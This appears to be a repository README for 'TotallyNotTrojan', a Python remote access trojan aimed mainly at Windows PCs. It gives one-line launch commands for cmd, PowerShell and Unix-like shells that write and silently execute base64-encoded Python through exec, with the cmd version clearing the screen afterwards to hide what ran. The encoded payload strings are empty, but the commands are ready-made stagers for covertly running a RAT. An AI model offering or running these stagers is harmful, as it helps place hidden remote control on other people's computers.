# TotallyNotTrojan
TotallyNotTrojan is a RAT written on Python. Works mostly with Windows PCs, but Client-side works also with *nix-systems.

# Cmd start
```
echo import base64;exec(base64.b64decode('')) > tnt.pyw && pythonw tnt.pyw && cls && ipconfig
```
# Powershell startup
```
cmd /c "echo import base64;exec(base64.b64decode('')) > tnt.pyw && pythonw tnt.pyw && exit"; exit
```
# *-nix startup
```
python3 -c "import base64;exec(base64.b64decode(''))"
```
